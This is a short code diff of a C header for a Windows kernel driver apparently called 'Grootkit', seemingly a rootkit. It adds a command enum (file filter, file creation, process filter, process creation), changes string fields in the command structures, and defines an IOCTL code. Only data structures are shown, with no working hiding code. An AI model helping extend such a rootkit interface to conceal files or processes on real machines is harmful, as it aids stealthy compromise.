@@ -5,13 +5,22 @@
 
 #define IOCTL_GROOTKIT CTL_CODE(GROOTKIT_DEVICE,0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
 
+enum CommandType
+{
+	InvalidCommandType = 0,
+	FileFilter = 1,
+	FileCreation = 2,
+	ProcessFilter = 3,
+	ProcessCreation = 4
+};
+
 struct FileFilterData {
-	PUNICODE_STRING filePath;
+	UNICODE_STRING filePath;
 };
 
 struct FileCreationData {
-	PUNICODE_STRING filePath;
-	PUNICODE_STRING data;
+	UNICODE_STRING filePath;
+	UNICODE_STRING data;
 };
 
 struct ProcessFilterData {
@@ -31,7 +40,7 @@ union CommandData
 };
 
 struct GrootkitData {
-	UINT16 whichCommand;
+	CommandType whichCommand;
 	CommandData command;
 };
 
